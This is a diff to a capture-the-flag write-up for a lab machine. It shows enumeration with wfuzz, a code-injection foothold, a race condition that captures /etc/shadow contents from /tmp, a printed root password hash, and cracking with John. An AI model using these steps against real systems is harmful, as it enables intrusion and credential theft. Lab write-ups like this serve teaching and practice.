@@ -90,6 +90,7 @@ The web service page source code reveals the following.
 ```
 <img src="source-code.png"><br>
 
+### Enumeration
 This provides a unique point for pivoting. `SuperSecureServer.py` must exist somewhere. We can use Wfuzz to enumerate possibilities.
 `wfuzz -w /usr/share/wordlists/dirb/big.txt --hc 404 http://obscure.htb:8080/FUZZ/SuperSecureServer.py`
 ```
@@ -125,6 +126,7 @@ The flaw in their code is seen here. The info variable line and exec function is
             exec(info.format(path)) # This is how you do string formatting, right?
 ```
 
+### Foothold
 Get creative, if you wish. The pre-text does not really matter.
 ```python
 #!/usr/bin/env python3
@@ -148,6 +150,7 @@ This reverse shell payload can be executed against the SuperSecureServer.py serv
 
 And now we have a foothold on the account running SuperSecureServer.py as a service. Now the real fun begins.
 
+### More enumeration!
 I like to start by identifying the processes running under my foothold account (www-data in this scenario).
 `www-data@obscure:/$ ps aux | grep www-data`
 ```
@@ -215,9 +218,7 @@ drwxrwxr-x 3 robert robert 4.0K Oct  3  2019 .local
 
 ```
 
-
-
-Now we peruse robert's files and transfer anything of interest using netcat.
+Peruse robert's files and transfer anything of interest using netcat.
 ```
 www-data@obscure:/home/robert$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct!
@@ -389,6 +390,7 @@ else:
             f.write(encrypted)
 ```
 
+### Offline attack for privilege escalation
 My initial instinct was to leave this code in tact and leverage it within my own BASHtardization. This, however, was a flop.
 I suspect my BASH logic was incorrect in some places, but it went something like this. This... *might* work with some massaging, but the real problem is the disk IOPS. It is simply too slow. We'd be here for a long time waiting for invalid results to prove invalid before finding our needle.
 ```bash
@@ -536,3 +538,40 @@ Here we goooooooo<br>
 
 wonk wonk wonkkkkk. There must be something to this. Oh right. There was another file in robert's home directory-- `passwordreminder.txt`. Copy that file to our kali workstation, run it through the original SuperSecuryCrypt.py code and use our cracked passphrase.<br>
 <img src="we-are-in.png"><br>
+
+### The final escalation to root
+Now that we've escalated our access to an account with a legit shell, look for a way to escalate to root privilege. The lowest hanging fruit would be through pre-existing sudo privileges and leveraging GTFOBins (or someting of the sort).
+
+Checking for sudo privileges...<br>
+<img src="sudo-privs.png"><br>
+
+Jackpot! And doesn't that look familiar? We should inspect this code further for any flaws. They were smart enough to properly set file permissions, so modifying the file is not an option. :( It's too bad really; that would've made this even easier. Surely there must be another way...
+
+And here's the flaw. They can read `/etc/shadow` since the file executes as root, bu they do not properly set the file permission after writing shadow's contents into a the `/tmp/` directory.
+```python
+with open('/etc/shadow', 'r') as f:
+    data = f.readlines()
+data = [(p.split(":") if "$" in p else None) for p in data]
+passwords = []
+for x in data:
+    if not x == None:
+        passwords.append(x)
+
+passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
+with open('/tmp/SSH/'+path, 'w') as f:
+    f.write(passwordFile)
+```
+However, they do remove this file by the end of the code, so the trick will be to capture the contents of this file *before* it is deleted! This is elementary and can be accomplished with a second terminal and a while loop.<br>
+<img src="capture-root-hash.png"><br>
+
+And here it is. Our diamond in the rough-- the root password sha512crypt hash. Create a file for your hash on kali so we can use it later.
+```
+kali@kali:~/htb/boxes/obscure$ cat root.sha512crypt
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+```
+
+Our friend John will help solve the mystery.<br>
+<img src="root-crack.png"><br>
+
+And voi la. We've obtained root. Flags for the challenge are shown as well.
+<img src="thats-all-folks.png">
